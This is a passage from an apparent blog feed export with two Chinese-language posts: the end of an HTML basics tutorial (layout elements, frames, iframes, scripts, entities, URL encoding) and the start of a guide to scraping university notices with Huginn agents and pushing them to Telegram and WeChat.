punctuation">></span></span></code></pre><style>.miaotest {    background-color:pink;    color:white;    margin:20px;    padding:20px;} </style><div class="miaotest"><p>London</p><p>London is the capital city of England. It is the most populous city in the United Kingdom, with a metropolitan area of over 13 million inhabitants.</p></div><div class="miaotest"><p>Paris</p><p>Paris is the capital and most populous city of France.</p></div><p>同理，也可以设置 <code>&lt;span&gt;</code> 元素的<code>class</code>属性来对相同类设置样式。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">  <span class="token selector">span<span class="token class">.redtest</span> </span><span class="token punctuation">{</span><span class="token property">color</span><span class="token punctuation">:</span>red<span class="token punctuation">;</span><span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>My <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>redtest<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Important<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span> Things<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></code></pre><style>  span.redtest {color:red;}</style><p>My <span class="redtest">Important</span> Things</p><br><h2 id="网页布局"><a href="#网页布局" class="headerlink" title="网页布局"></a>网页布局</h2><p>这里 HTML5 新增了不少语义化元素，替代了原先 <code>&lt;div id="xxx"&gt;</code>这样定义网页布局的形式。</p><p>具体的语义元素是这样的。</p><table><thead><tr><th align="left">语义元素</th><th>含义</th></tr></thead><tbody><tr><td align="left">header</td><td>定义文档或节的页眉</td></tr><tr><td align="left">nav</td><td>定义导航链接的容器</td></tr><tr><td align="left">section</td><td>定义文档中的节</td></tr><tr><td align="left">article</td><td>定义独立的自包含文章</td></tr><tr><td align="left">aside</td><td>定义内容之外的内容（比如侧栏）</td></tr><tr><td align="left">footer</td><td>定义文档或节的页脚</td></tr><tr><td align="left">details</td><td>定义额外的细节</td></tr><tr><td align="left">summary</td><td>定义 details 元素的标题</td></tr></tbody></table><p><img src="/2020/02/14/FrontEnd_HTML_Basic/ct_sem_elements.png" alt="HTML5 语义元素"></p><p>例如：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>header</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>City Gallery<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>header</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>nav</span><span class="token punctuation">></span></span>London<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>Paris<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>Tokyo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>nav</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>section</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>London<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>London is the capital city of England. It is the most populous city in the United Kingdom,with a metropolitan area of over 13 million inhabitants.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Standing on the River Thames, London has been a major settlement for two millennia,its history going back to its founding by the Romans, who named it Londinium.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>section</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>footer</span><span class="token punctuation">></span></span>Copyright W3School.com.cn<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>footer</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></code></pre><p>具体后面再看看 HTML5 的新语义元素吧（</p><br><h2 id="框架-1"><a href="#框架-1" class="headerlink" title="框架"></a>框架</h2><p><strong>通过使用框架，可以在同一个浏览器窗口中显示不止一个页面。</strong></p><p>每份HTML文档称为一个框架，并且每个框架都独立于其他的框架。</p><h3 id="结构框架标签-frameset"><a href="#结构框架标签-frameset" class="headerlink" title="结构框架标签 frameset"></a>结构框架标签 frameset</h3><p><code>frameset</code>标签 / 框架集</p><p>它定义了如何将窗口分割为框架。每个 <code>frameset</code> 定义了一系列 行 <strong>或</strong> 列。</p><p>rows/columns 的值规定了每行或每列占据屏幕的面积。</p><h3 id="框架标签-frame"><a href="#框架标签-frame" class="headerlink" title="框架标签 frame"></a>框架标签 frame</h3><p><code>frame</code> 标签定义了放置在每个框架中的 HTML 文档。</p><p>例如，下面这个例子定义了一个两列框架集，第一列占窗口的25%，显示<code>frame_a.htm</code>；第二列占75%，显示<code>frame_b.htm</code>。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>frameset</span> <span class="token attr-name">cols</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>25%,75%<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>frame</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>frame_a.htm<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>frame</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>frame_b.htm<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>frameset</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>假如一个框架有可见边框，用户可以拖动边框来改变它的大小。为了避免这种情况发生，可以在 <code>&lt;frame&gt;</code> 标签中加入：<code>noresize="noresize"</code>。</p><p>即（此处分成两行<code>rows</code>）</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>frameset</span> <span class="token attr-name">rows</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>25%,75%<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>frame</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>frame_a.htm<span class="token punctuation">"</span></span> <span class="token attr-name">noresize</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>noresize<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>frame</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>frame_b.htm<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>frameset</span><span class="token punctuation">></span></span></code></pre><h3 id="noframes-标签"><a href="#noframes-标签" class="headerlink" title="noframes 标签"></a>noframes 标签</h3><p><strong>不能将 <code>&lt;body&gt;&lt;/body&gt;</code> 标签与 <code>&lt;frameset&gt;&lt;/frameset&gt;</code>  标签同时使用！</strong></p><p>不过，假如添加包含一段文本的 <code>&lt;noframes&gt;</code> 标签，就必须将这段文字嵌套于  <code>&lt;body&gt;&lt;/body&gt;</code> 标签内。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>frameset</span> <span class="token attr-name">cols</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>25%,50%,25%<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>frame</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/example/html/frame_a.html<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>frame</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/example/html/frame_b.html<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>frame</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/example/html/frame_c.html<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>noframes</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>您的浏览器无法处理框架！<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>noframes</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>frameset</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><h3 id="混合框架结构"><a href="#混合框架结构" class="headerlink" title="混合框架结构"></a>混合框架结构</h3><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>frameset</span> <span class="token attr-name">rows</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>50%,50%<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>frame</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/example/html/frame_a.html<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>frameset</span> <span class="token attr-name">cols</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>25%,75%<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>frame</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/example/html/frame_b.html<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>frame</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/example/html/frame_c.html<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>frameset</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>frameset</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p><img src="/2020/02/14/FrontEnd_HTML_Basic/frame.png" alt="混合框架"></p><br><h2 id="内嵌框架"><a href="#内嵌框架" class="headerlink" title="内嵌框架"></a>内嵌框架</h2><p><strong><em>Iframe</em> 用于在网页内显示网页。</strong></p><p><code>height</code> 和 <code>width</code> 属性用于规定 <code>iframe</code> 的高度和宽度。</p><p>属性值的默认单位是像素，但也可以用百分比来设定（比如 “80%”）。</p><p>对于不支持<code>iframe</code>的浏览器，可以把需要的提示文本放置在 <code>&lt;iframe&gt;</code> 和 <code>&lt;/iframe&gt;</code> 之间。</p><p>比如这里嵌套了一个我的博客首页（套娃嘻嘻嘻</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://miaotony.xyz<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>600<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>400<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>您的浏览器不支持iframe唉<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span></code></pre><iframe src="https://miaotony.xyz" width="600" height="400"></iframe>---<p><code>iframe</code> 可用作链接的目标（<code>target</code>）。</p><p>链接的 <code>target</code> 属性必须引用 <code>iframe</code> 的 <code>name</code> 属性：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://miaotony.xyz<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>600<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>200<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>iframe_miao<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://miaotony.xyz/friends<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>iframe_miao<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>friends<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></code></pre><iframe src="https://miaotony.xyz" width="600" height="200" name="iframe_miao"></iframe><a href="https://miaotony.xyz/friends" target="iframe_miao">friends</a><p><em>（可能部署博客的时候这里用不了</em></p><br><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><p><strong>script 元素</strong></p><p><code>&lt;script&gt;</code> 标签用于定义客户端脚本，比如 JavaScript。</p><p><code>script</code> 元素既可包含脚本语句，也可通过 <code>src</code> 属性指向外部脚本文件。</p><p><code>&lt;noscript&gt;</code> 标签提供无法使用脚本时的替代内容。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">    <span class="token keyword">function</span> <span class="token function">sayhello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Hello World!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>noscript</span><span class="token punctuation">></span></span>Sorry, your browser does not support JavaScript!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>noscript</span><span class="token punctuation">></span></span></code></pre><script type="text/javascript">    function sayhello(){        alert("Hello World!");    }</script><p><noscript>Sorry, your browser does not support JavaScript!</noscript><br><button onclick="sayhello();">点这里试试呗~</button></p><p><em>后面学JavaScript再慢慢看（</em></p><br><h2 id="字符实体"><a href="#字符实体" class="headerlink" title="字符实体"></a>字符实体</h2><p><strong>HTML 中的预留字符必须被替换为字符实体。</strong></p><p>形式类似于这样</p><pre><code>&amp;entity_name;&amp;#entity_number;</code></pre><p>如 <code>&amp;lt;</code> 或 <code>&amp;#60;</code> 表示小于号 &lt; 。</p><p>不间断空格 <code>&amp;nbsp;</code></p><br><h2 id="URL-编码"><a href="#URL-编码" class="headerlink" title="URL 编码"></a>URL 编码</h2><p>URL，<em>Uniform Resource Locator</em>，统一资源定位符。</p><p>URL 只能使用 ASCII 字符集来通过因特网进行发送。</p><p><strong>URL 编码会将字符转换为可通过因特网传输的格式。</strong></p><p>它使用 “%” 其后跟随两位的十六进制数来替换非 ASCII 字符。</p><p>URL 不能包含空格。URL 编码通常使用 <code>+</code> 来替换空格。</p><p>（之前玩CTF就遇到过一个题，它的某个参数里需要输入加号（<code>+</code>），所以要写成 <code>%2b</code>。</p><p><br><br></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p><strong>入门就到这里了吧</strong>emmm</p><p>虽然有点枯燥，但所见所得还是挺有趣的哈哈哈。</p><p><strong>进阶</strong>再来看看HTML的表单与输入，还有H5中的新元素，画布、音视频等等。</p><p>溜了溜了 嘻嘻嘻</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> FrontEnd </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FrontEnd </tag>
            
            <tag> HTML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小想法 | 利用Huginn&amp;TelegramBot实现教务通知自动爬取与推送</title>
      <link href="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/"/>
      <url>/2020/02/11/Idea_Huginn_AAONoticeAutoPush/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前不久在服务器上装好了Huginn（<a href="https://miaotony.xyz/2020/02/03/Server_Huginn/">详见这里：基于Docker搭建Huginn</a>）。</p><p>这几天折腾了一下，尝试着用它来爬点东西玩一下<em>（bushi</em></p><p>想了一下，平时会关注<strong>教务的通知</strong>，每次都要访问教务网站，虽然说也不是很麻烦，但我想要一个自动推送的工具。或者说，不需要我主动去看有没有新通知，而是有新通知公告了就直接推过来。（类似于Webhook？ 😃</p><p>说到这个，其实之前在 RSSHub 上看到过一个，不过现在好像失效了。考虑到目前没有折腾 RSSHub 的打算，干脆就用 Huginn 自己弄一个好了。</p><p>说干就干了啦。</p><p>哦对了，最终的效果大概这样——</p><p><img src="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/WeChatNotification.png" alt="WeChatNotification"></p><p><img src="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/TG_PC.png" alt="Telegram PC端"></p><p><img src="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/TG_Mobile.png" alt="Telegram Mobile"></p><hr><h2 id="通知的爬取"><a href="#通知的爬取" class="headerlink" title="通知的爬取"></a>通知的爬取</h2><p>与其说专门打造一个教务通知公告的爬取，不如说记录一下 Huginn 的基本使用方法。</p><p>说实话，<strong>Huginn 的资料真的少</strong>，感觉国内都没有多少介绍这个的，于是遇到了不少问题经常不知道怎么办emmm。</p><h3 id="一些小介绍"><a href="#一些小介绍" class="headerlink" title="一些小介绍"></a>一些小介绍</h3><p>打开你喜欢的浏览器，进入 Huginn（默认为 <code>127.0.0.1:3000</code>），最上方有如下几个选项。</p><p><img src="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/huginn_intro.png" alt="标题栏"></p><p>其中Agents就是你的一个个小兵，他们可以互相协作，按照流水线依次完成各自的使命。</p><p>Scenarios 就是这些小兵的集合，或者说是某种场景，官方描述是</p><blockquote><p>Scenarios are named groups of Agents.  Scenarios allow you to organize your agents, and to import and export sets of Agents to share.</p></blockquote><p>比如说你有A、B、C三个Agent，他们共同完成一个任务，你就可以把他们集合起来作为一个Scenario。</p><p>Events 是小兵们收集来的信息。</p><p>Credentials 用来记录一些常量，或者说是环境变量。</p><blockquote><p>Credentials are used to store values used by many Agents. Examples might include “twitter_consumer_secret”, “user_full_name”, or “user_birthday”.      </p></blockquote><p>在使用时，就可以像 <code> {% credential Meow_API %} </code> 这样来引用，其中 <code>Meow_API</code> 在 Credentials 中进行定义。</p><h3 id="大体思路"><a href="#大体思路" class="headerlink" title="大体思路"></a>大体思路</h3><p>Huginn 里有很多种 Agent，这里用到的可以说是最常用的 <strong>Website Agent</strong> 和 <strong>Post Agent</strong> 。</p><p>更多的可以参考官方 Wiki 的介绍，在<a href="https://github.com/huginn/huginn/wiki/Agent-Types-&amp;-Descriptions" target="_blank" rel="noopener">这里</a>。</p><p>这个项目的思路就是</p><ul><li>访问教务网站，爬取通知公告栏的标题及链接</li><li>根据得到的链接，访问相应网址，获得通知具体内容</li><li>将得到的信息打包，根据 Server Chan 和 Telegram Bot API 的格式发送即可</li></ul><h3 id="创建获取信息的-Agent"><a href="#创建获取信息的-Agent" class="headerlink" title="创建获取信息的 Agent"></a>创建获取信息的 Agent</h3><p><strong>Crawler_AAO #1 Get Notice URLs</strong></p><p>选择 Website Agent，界面如下：</p><p> <img src="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/WebsiteAgent.png" alt="Website Agent"></p><p><code>Name</code>自己取个喜欢的名字。</p><p><code>Schedule</code>可以指定运行的周期。如果列表里没有合适的选项的话，可以选择Never，再另外创建一个<strong>Scheduler Agent</strong>，以<a href="http://en.wikipedia.org/wiki/Cron" target="_blank" rel="noopener">cron</a>格式自己写一个，然后在<code>Controllers</code>里指向这个Scheduler Agent。</p><p><code>Keep events</code>可以定义获得Events后保留的时间，过期后自动会删除之前的Events。每次爬取后，获得新的数据才作为一个event，否则不会触发一个新的event，可以说在一定程度上起到了去重的作用。（当然如果还有重复的话，可以后面再加一个<strong>De-duplication Agent</strong>）</p><p>如果数据量过大的话最好不要设成<code>Forever</code>。但是要确保在下一个 Agent 能够在 Event 过期之前获取到数据。</p><p><code>Sources</code>就是上一个Agent，<code>Receivers</code>就是下一个Agent。勾选<code>Propagate immediately</code>的话，上一个Agent获取到数据后则立即执行这个Agent，否则会间隔一分钟再执行。（开启会加重CPU负担）</p><p><code>Scenarios</code>就是那个Agents的集合啦。</p><p><code>Options</code>里是具体的配置，是JSON的格式，可以参考右边的提示来进行设置。</p><p>怎么说好呢，其实简单的参数右边是有了，但是实际配置的时候还是有不少问题。看官方文档吧emmm</p><p><a href="https://huginnio.herokuapp.com/agents" target="_blank" rel="noopener">https://huginnio.herokuapp.com/agents</a> 这里有关于Agents各自API的详细介绍。</p><hr><p>下面是<code>options</code>的具体介绍。</p><p>Website Agent可以爬取来自<code>url</code>/<code>url_from_event</code>/<code>data_from_event</code>的信息。</p><h4 id="type"><a href="#type" class="headerlink" title="type"></a>type</h4><p>可以<code>xml</code>, <code>html</code>, <code>json</code>, or <code>text</code>。相应的类型有各自的介绍，这里是HTML网页，就用<code>html</code>好了。</p><h4 id="mode"><a href="#mode" class="headerlink" title="mode"></a>mode</h4><p>可以是<code>all</code>, <code>on_change</code>, or <code>merge</code>。If you specify <code>merge</code> for the <code>mode</code> option, Huginn will retain the old payload and update it with new values. </p><p>即如果选择<code>merge</code>，则会与之前的信息合并，这个在获取教务通知的具体内容时会用到，之后不再赘述。这里只需要在出现新通知的时候触发，所以用<code>on_change</code>。</p><h4 id="extract"><a href="#extract" class="headerlink" title="extract"></a>extract</h4><p><code>extract</code>里就是要解析的内容，可以用a CSS selector in <code>css</code> or an XPath expression in <code>xpath</code>. （如果<code>type</code>里选<code>text</code>则可以用<code>regexp</code>正则匹配，<em>然而如果要html提取后再正则匹配就需要再来一个Agent，感觉有点蠢emmm如果有更好的办法欢迎来和我交流一下哈</em>）</p><ul><li><p><strong>要注意的是：</strong>这个解析的内容是根据url浏览后<strong>直接获得的页面，没有加载文本之外的任何内容，没有经过JavaScript渲染等等</strong>。或者说就是你<code>F12</code>在<code>Network</code>里看到的页面加载出来的document或xhr之类得到的response。<em>（这个是在利用 Huginn 爬取其他网站的时候发现的）</em></p></li><li><p>如果需要爬取JavaScript加载的网页，可以使用 <strong>Phantom Js Cloud Agent</strong>，这个需要在<a href="https://phantomjscloud.com/" target="_blank" rel="noopener">PhantomJs Cloud</a>申请一个API，有一定的免费额度。这个Agent会返回页面的相应信息，还可以具体设置输出JSON、截图等等。</p></li></ul><p><code>extract</code>里以JSON格式写要解析的对象，后面就会返回 相应名字作为Key，相应的值作为Value 的JSON结果。</p><p>CSS可以这样找↓，直接<strong>复制CSS路径</strong>，再进行缩略处理。</p><p><img src="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/css_selector.png" alt="复制css路径"></p><p>比如这里复制出来是</p><pre class=" language-css"><code class="language-css">html body div<span class="token number">.</span>container-fluid div<span class="token number">.</span>main-content<span class="token number">.</span>clearfix div<span class="token number">.</span>left-content div<span class="token number">.</span>notice-announcement div#index_notice_content<span class="token number">.</span>tab-content div<span class="token number">.</span>tab-pane<span class="token number">.</span>active ul<span class="token number">.</span>tab-pane-ul li div<span class="token number">.</span>inform-content a</code></pre><p>然后<strong>处理 css path</strong>。</p><p>原始路径过长，<strong>删去不带 <code>.</code> 或 <code>#</code> 的节点（节点间以空格“ ”分割），并删去每个节点在 <code>.</code> 或 <code>#</code>前的第一个标签</strong>，得到：</p><pre class=" language-css"><code class="language-css"><span class="token number">.</span>container-fluid <span class="token number">.</span>main-content<span class="token number">.</span>clearfix <span class="token number">.</span>left-content <span class="token number">.</span>notice-announcement #index_notice_content<span class="token number">.</span>tab-content <span class="token number">.</span>tab-pane<span class="token number">.</span>active <span class="token number">.</span>tab-pane-ul <span class="token number">.</span>inform-content a</code></pre><p>前半部分对节点定位用处不大，继续缩略，于是得到</p><pre class=" language-css"><code class="language-css"><span class="token number">.</span>tab-pane<span class="token number">.</span>active <span class="token number">.</span>tab-pane-ul <span class="token number">.</span>inform-content a</code></pre><blockquote><p><strong>非常规情况处理</strong>： </p><p>a. 有些路径中的<strong>节点带空格</strong>，如<code>&lt;div class="packery-item article"&gt;</code>,路径中的空格由<code>.</code>代替，截取为<code>.packery-item.article</code> </p><p>b. 当抓取<strong>多种 css path 规则</strong>时，用逗号<code>,</code>分割</p><pre class=" language-css"><code class="language-css"><span class="token string">"css"</span><span class="token punctuation">:</span> <span class="token string">".focus-title .current a , .stress h2 a"</span>,</code></pre></blockquote><p><code>value</code>用来提取标签中的属性，可以利用<a href="https://www.w3.org/TR/xpath/#section-String-Functions" target="_blank" rel="noopener">XPath functions</a>。（<a href="https://www.w3school.com.cn/xpath/xpath_functions.asp" target="_blank" rel="noopener">中文介绍</a>）</p><p>Xpath Functions是可以进行嵌套来用的<del>（套娃</del>（x</p><p>这里用了 <code>@href</code>来提取链接，用<code>string(.)</code>来提取这个css路径下的字符串，用 <code>normalize-space</code>函数来去除多余的空格。得到的JSON表达式如下。</p><pre class=" language-json"><code class="language-json"><span class="token property">"extract"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token punctuation">{</span>        <span class="token property">"css"</span><span class="token operator">:</span> <span class="token string">".tab-pane.active .tab-pane-ul .inform-content a"</span><span class="token punctuation">,</span>        <span class="token property">"value"</span><span class="token operator">:</span> <span class="token string">"@href"</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token property">"title"</span><span class="token operator">:</span> <span class="token punctuation">{</span>        <span class="token property">"css"</span><span class="token operator">:</span> <span class="token string">".tab-pane.active .tab-pane-ul .inform-content a"</span><span class="token punctuation">,</span>        <span class="token property">"value"</span><span class="token operator">:</span> <span class="token string">"normalize-space(string(.))"</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="template"><a href="#template" class="headerlink" title="template"></a>template</h4><p>除了上面这些，还可以设置<strong>User Agent</strong>，以及一个用<strong>Liquid模板语言编写的模板<code>template</code></strong>等等。</p><blockquote><p>Liquid markup language. Safe, customer facing template language for flexible web apps.  </p></blockquote><p>Liquid官方仓库：<a href="https://github.com/Shopify/liquid" target="_blank" rel="noopener">https://github.com/Shopify/liquid</a>。这里有关于Liquid语法的中文介绍：<a href="https://liquid.bootcss.com/" target="_blank" 